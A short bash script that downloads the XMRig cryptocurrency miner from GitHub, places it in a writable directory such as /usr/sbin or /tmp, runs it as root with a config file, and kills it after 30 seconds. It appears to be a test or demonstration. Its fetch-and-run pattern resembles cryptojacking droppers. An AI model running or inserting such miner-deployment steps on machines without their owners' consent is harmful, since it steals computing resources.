#!/bin/bash
set -x

export HOME=/root
export LC_ALL=C

echo 'Handling download XMRig ...'
if [ -w /usr/sbin ] ;
    then export SPATH=/usr/sbin ;
else if [ -w /tmp ] ;
    then export SPATH=/tmp ;
    fi;
    if [ -w /var/tmp ] ;
        then export SPATH=/var/tmp ;
    fi ;
fi

curl -LO https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz
tar xf xmrig-6.19.2-linux-static-x64.tar.gz
mv xmrig-6.19.2/xmrig $SPATH/xmrig
$SPATH/xmrig --config /root/config.json &
sleep 30 && pkill -9 xmrig
